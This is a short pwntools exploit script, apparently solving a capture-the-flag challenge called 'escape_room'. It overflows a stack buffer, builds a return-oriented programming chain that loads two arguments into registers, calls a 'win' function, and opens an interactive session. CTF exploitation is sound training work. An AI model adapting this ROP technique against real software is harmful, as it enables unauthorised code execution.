from pwn import *

context.binary=elf=ELF("./escape_room")
p=remote("offsec.m0lecon.it",13541)
#p=process(elf.path)
offset=64+8
arg1 = 0xdeadbeef
arg2 = 0xcafebabe
gadgets=elf.sym.gadgets
ret=ROP(elf).find_gadget(['ret'])[0]
pop_rdi=ROP(elf).find_gadget(['pop rdi','ret'])[0]
pop_rsi=ROP(elf).find_gadget(['pop rsi','ret'])[0]


p.recvuntil(b"keys?")

payload=flat(
    b'a'*offset,
    p64(ret),
    p64(pop_rdi),p64(arg1),
    p64(pop_rsi),p64(arg2),
    p64(elf.sym.win)
)
p.sendline(payload)
print(p.recv())
p.interactive()
